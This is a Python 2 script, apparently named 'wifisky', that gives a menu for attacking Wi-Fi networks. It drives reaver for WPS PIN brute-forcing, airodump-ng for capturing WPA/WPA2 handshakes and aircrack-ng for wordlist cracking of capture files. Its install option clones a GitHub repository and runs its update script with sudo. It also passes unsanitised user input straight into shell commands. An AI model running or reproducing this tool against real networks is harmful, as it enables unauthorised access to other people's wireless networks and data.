import os
import sys
import subprocess
from os import system
from time import sleep

follow = """
{+}-- https://www.facebook.com/dzmanisso
{+}-- https://twitter.com/ManissoDz
{+}-- https://github.com/Manisso
{+}-- https://www.linkedin.com/in/Manisso
{+}-- https://www.instagram.com/man.i.s/
"""

#Wash is a utility for identifying WPS enabled access points. It can survey from a live interface or it can scan a list of pcap files.
#Wash is an auxiliary tool designed to display WPS enabled Access Points and their main characteristics. Wash is included in the Reaver package.
#Homepage: https://github.com/t6x/reaver-wps-fork-t6x
#Author: Tactical Network Solutions, Craig Heffner, t6_x, DataHead, Soxrok2212
#License: GPLv2 


#Reaver implements a brute force attack against Wifi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 
#Reaver has been designed to be a robust and practical attack against WPS, and has been tested against a wide variety of access points and WPS implementations.
#Reaver Homepage | Kali Reaver Repo
#Author: Tactical Network Solutions, Craig Heffner
##License: GPLv2



logo = """\033[93m               __   ___ __         __          
    .--.--.--.|__|.'  _|__|.-----.|  |--.--.--.
    |  |  |  ||  ||   _|  ||__ --||    <|  |  |
    |________||__||__| |__||_____||__|__|___  |
\033[91m    }--{+}    Coded By Manisso    {+}--{\033[0m\033[93m|_____|\033[0m                                
       """

menu = """\033[97m
{1}--WPS ATTACK
{2}--WPA/WPA2 ATTACK
{3}--CAP BRUTFORCE
{0}--INSTALL & UPDATE
{99}-EXIT
    
"""


if not os.geteuid() == 0:
  sys.exit("""\033[1;91m\n[!] Must be run as root. [!]\n\033[1;m""")

os.system("clear && clear")
print logo  
print menu 
def quit():
            con = raw_input('Continue [Y/n] -> ')
            if con[0].upper() == 'N':
                exit()
            else:
                os.system("clear")
                print logo
                print menu
                select()   

def  select():
  try:
    choice = input("\033[92mWIFISKY~# \033[0m")
    if choice == 1:
	  os.system("airmon-ng")
	  interface = raw_input("Enter your Interface : ")
	  inter = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(interface)
	  system(inter)
	  wash = 'wash -i {0}'.format(interface)
	  print "\033[1mCtrl + C To Stop \033[0m"
	  system(wash)
	  print (" ")
	  bssid = raw_input("BSSID: ")
	  print "\033[1mWPS ATTACK will start now\033[0m"
	  sleep(5)
	  reaver = 'reaver -i {0} -b {1} '.format(interface, bssid)
	  system(reaver)
    elif choice == 2:
		os.system("airmon-ng")
		interface = raw_input("Enter your Interface : ")
		inter = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(interface)
		system(inter)
		dump = 'airodump-ng {0}'.format(interface)
		print "\033[1mCtrl + C To Stop \033[0m"
		sleep(3)
		system(dump)
		print (" ")
		bssid = raw_input("BSSID: ")
		ch = raw_input("channel : ")
		sv = raw_input("File Name : ")
		airo = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(ch, bssid, sv, interface)
		system(airo)
    elif choice == 99:
		exit
    elif choice == 0:
		os.system("clear")
		print("This tool is only available for Linux and similar systems  ")
		os.system("git clone https://github.com/Manisso/wifisky.git")
		os.system("cd wifisky && sudo bash ./update.sh")
		os.system("wifisky")	
    elif choice == 3:
		wordlist = raw_input("wordlist : ")
		save2 = raw_input("Enter the CAP file name : ")
		crack = 'aircrack-ng {0} -w {1} '.format(save2, wordlist)
		system(crack)
  except(KeyboardInterrupt):
    print ""
select()
